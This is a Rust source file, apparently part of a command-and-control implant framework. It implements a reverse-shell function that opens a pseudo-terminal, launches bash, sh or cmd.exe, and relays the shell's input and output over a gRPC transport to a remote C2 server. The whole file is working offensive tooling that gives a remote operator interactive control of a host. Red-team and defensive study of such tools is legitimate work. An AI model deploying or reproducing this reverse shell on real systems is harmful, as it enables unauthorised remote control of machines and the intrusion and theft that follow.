use anyhow::Result;
use eldritch_agent::Context;
use pb::c2::{ReverseShellMessageKind, ReverseShellRequest, reverse_shell_request};
use transport::Transport;

#[cfg(not(target_os = "solaris"))]
use portable_pty::{CommandBuilder, PtySize, native_pty_system};
#[cfg(not(target_os = "solaris"))]
use std::io::{Read, Write};

#[cfg(all(not(target_os = "windows"), not(target_os = "solaris")))]
use std::path::Path;

#[cfg(not(target_os = "solaris"))]
pub async fn run_reverse_shell_pty<T: Transport>(
    context: Context,
    cmd: Option<String>,
    mut transport: T,
) -> Result<()> {
    // Channels to manage gRPC stream
    let (output_tx, output_rx) = tokio::sync::mpsc::channel(1);
    let (input_tx, mut input_rx) = tokio::sync::mpsc::channel(1);
    // We will recreate the internal channels needed for the loop.
    let (internal_exit_tx, mut internal_exit_rx) = tokio::sync::mpsc::channel(1);

    #[cfg(debug_assertions)]
    log::info!("starting reverse_shell_pty (context={:?})", context);

    let context_val = match &context {
        Context::Task(tc) => Some(reverse_shell_request::Context::TaskContext(tc.clone())),
        Context::ShellTask(stc) => Some(reverse_shell_request::Context::ShellTaskContext(
            stc.clone(),
        )),
    };

    // First, send an initial registration message
    if let Err(_err) = output_tx
        .send(ReverseShellRequest {
            context: context_val.clone(),
            kind: ReverseShellMessageKind::Ping.into(),
            data: Vec::new(),
        })
        .await
    {
        #[cfg(debug_assertions)]
        log::error!("failed to send initial registration message: {_err}");
    }

    // Use the native pty implementation for the system
    let pty_system = native_pty_system();

    // Create a new pty
    let pair = match pty_system.openpty(PtySize {
        rows: 24,
        cols: 80,
        pixel_width: 0,
        pixel_height: 0,
    }) {
        Ok(p) => p,
        Err(e) => {
            return Err(e);
        }
    };

    // Spawn command into the pty
    let cmd_builder = match cmd {
        Some(c) => CommandBuilder::new(c),
        None => {
            #[cfg(not(target_os = "windows"))]
            {
                if Path::new("/bin/bash").exists() {
                    CommandBuilder::new("/bin/bash")
                } else {
                    CommandBuilder::new("/bin/sh")
                }
            }
            #[cfg(target_os = "windows")]
            CommandBuilder::new("cmd.exe")
        }
    };

    let mut child = match pair.slave.spawn_command(cmd_builder) {
        Ok(c) => c,
        Err(e) => {
            return Err(e);
        }
    };

    let mut reader = match pair.master.try_clone_reader() {
        Ok(r) => r,
        Err(e) => {
            return Err(e);
        }
    };
    let mut writer = match pair.master.take_writer() {
        Ok(w) => w,
        Err(e) => {
            return Err(e);
        }
    };

    // Spawn task to send PTY output
    const CHUNK_SIZE: usize = 1024;
    let output_tx_clone = output_tx.clone();
    let context_val_clone = context_val.clone();
    tokio::spawn(async move {
        loop {
            let mut buffer = [0; CHUNK_SIZE];
            let n = match reader.read(&mut buffer[..]) {
                Ok(n) => n,
                Err(_err) => {
                    #[cfg(debug_assertions)]
                    log::error!("failed to read pty: {_err}");
                    break;
                }
            };

            if n < 1 {
                match internal_exit_rx.try_recv() {
                    Ok(None) | Err(tokio::sync::mpsc::error::TryRecvError::Empty) => {}
                    Ok(Some(_status)) => {
                        #[cfg(debug_assertions)]
                        log::info!("closing output stream, pty exited: {_status}");
                        break;
                    }
                    Err(tokio::sync::mpsc::error::TryRecvError::Disconnected) => {
                        #[cfg(debug_assertions)]
                        log::info!("closing output stream, exit channel closed");
                    }
                }
                continue;
            }

            if let Err(_err) = output_tx_clone
                .send(ReverseShellRequest {
                    context: context_val_clone.clone(),
                    kind: ReverseShellMessageKind::Data.into(),
                    data: buffer[..n].to_vec(),
                })
                .await
            {
                #[cfg(debug_assertions)]
                log::error!("reverse_shell_pty output failed to queue: {_err}");
                break;
            }

            // Ping to flush
            if let Err(_err) = output_tx_clone
                .send(ReverseShellRequest {
                    context: context_val_clone.clone(),
                    kind: ReverseShellMessageKind::Ping.into(),
                    data: Vec::new(),
                })
                .await
            {
                #[cfg(debug_assertions)]
                log::error!("reverse_shell_pty ping failed: {_err}");
                break;
            }
        }
    });

    // Initiate gRPC stream
    if let Err(e) = transport.reverse_shell(output_rx, input_tx).await {
        let _ = child.kill();
        return Err(e);
    }

    // Handle Input
    loop {
        if let Ok(Some(_status)) = child.try_wait() {
            #[cfg(debug_assertions)]
            log::info!("closing input stream, pty exited: {_status}");
            break;
        }

        let context_val_clone = context_val.clone();
        if let Some(msg) = input_rx.recv().await {
            if msg.kind == ReverseShellMessageKind::Ping as i32 {
                if let Err(_err) = output_tx
                    .send(ReverseShellRequest {
                        context: context_val_clone,
                        kind: ReverseShellMessageKind::Ping.into(),
                        data: msg.data,
                    })
                    .await
                {
                    #[cfg(debug_assertions)]
                    log::error!("reverse_shell_pty ping echo failed: {_err}");
                }
                continue;
            }
            if let Err(_err) = writer.write_all(&msg.data) {
                #[cfg(debug_assertions)]
                log::error!("reverse_shell_pty failed to write input: {_err}");
            }
        } else {
            let _ = child.kill();
            break;
        }
    }

    let status = child.wait().ok();
    if let Some(s) = status {
        let _ = internal_exit_tx.send(Some(s)).await;
    }

    #[cfg(debug_assertions)]
    log::info!("stopping reverse_shell_pty");
    Ok(())
}

#[cfg(target_os = "solaris")]
pub async fn run_reverse_shell_pty<T: Transport>(
    _context: Context,
    _cmd: Option<String>,
    _transport: T,
) -> Result<()> {
    #[cfg(debug_assertions)]
    log::error!("reverse_shell_pty is not supported on Solaris");
    Err(anyhow::anyhow!("reverse_shell_pty is not supported on Solaris"))
}
